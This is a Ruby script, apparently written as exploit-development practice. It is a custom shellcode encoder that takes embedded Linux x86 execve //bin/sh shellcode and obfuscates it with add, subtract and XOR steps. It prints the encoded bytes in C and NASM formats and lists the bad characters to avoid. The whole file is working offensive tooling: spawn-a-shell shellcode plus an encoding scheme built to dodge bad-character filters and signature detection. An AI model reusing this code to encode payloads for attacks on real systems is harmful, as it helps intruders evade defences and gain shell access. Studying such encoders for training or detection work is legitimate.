#!/usr/bin/ruby
=begin
encode.rb
Sanjiv Kawa (@skawasec)
This encoder takes an arbitrary length shellcode and adds 5 to the first 10 elements
The remaining elements are subtracted by 7
An XOR with 0xd3 is then done on all of the elements in the array

Bad characters for shellcode: 0xd3, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07
=end

# this is the execve //bin/sh stack shellcode
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

def encode(shellcode)

  # unpack the shellcode into 8 bit unsigned integer values
  unpacked = shellcode.unpack('C*')

  encoded = Array.new

  # Add 5 to the first 10 bytes of the shellcode
  for i in 0..9
    encoded.push unpacked[i] + 5
  end

  # Minus 7 on all remaining bytes in the shellcode
  for i in 10..unpacked.length-1
    encoded.push unpacked[i] - 7
  end

  # XOR each element in the array with 0xd3
  encoded.map!{|element|element ^ 0xd3}

  packed = Array.new
  packednasm = Array.new

  for element in encoded
    packed.push "\\x#{element.to_s(16)}" # \x format
    packednasm.push "0x#{element.to_s(16)}," # 0x format
  end

  puts "[+] C hex format:"
  puts "\"" + packed.join + "\";"
  puts ""
  puts "[+] nasm hex format:"
  puts packednasm.join[0...-1] #remove the last comma
  puts ""
  puts "[+] Total length: #{packednasm.length}"

end
encode(shellcode)
